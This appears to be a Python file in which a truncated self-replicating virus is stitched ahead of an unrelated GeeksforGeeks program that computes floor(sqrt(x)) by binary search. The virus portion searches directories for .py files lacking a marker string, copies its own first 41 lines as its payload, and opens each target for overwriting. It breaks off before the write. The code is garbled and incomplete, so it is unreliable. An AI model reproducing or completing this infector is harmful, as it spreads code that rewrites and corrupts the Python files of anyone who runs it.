#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python 3 program to find floor(sqrt(x)

# Returns floor of square root of x


def floorSqrt(x):

	# Base cases
	if (x == 0 or x == 1):
		return x

	# Do Binary Search for floor(sqrt(x))
	start = 1
	end = x//2
	while (start <= end):
		mid = (start + end) // 2

		# If x is a perfect square
		if (mid*mid == x):
			return mid

		# Since we need floor, we update
		# answer when mid*mid is smaller
		# than x, and move closer to sqrt(x)
		if (mid * mid < x):
			start = mid + 1
			ans = mid

		else:

			# If mid*mid is greater than x
			end = mid-1

	return ans


# driver code
x = 11
print(floorSqrt(x))

# This code is contributed by Nikita Tiwari.
# Time Complexity: O(log(X))
# Space Complexity: O(1)
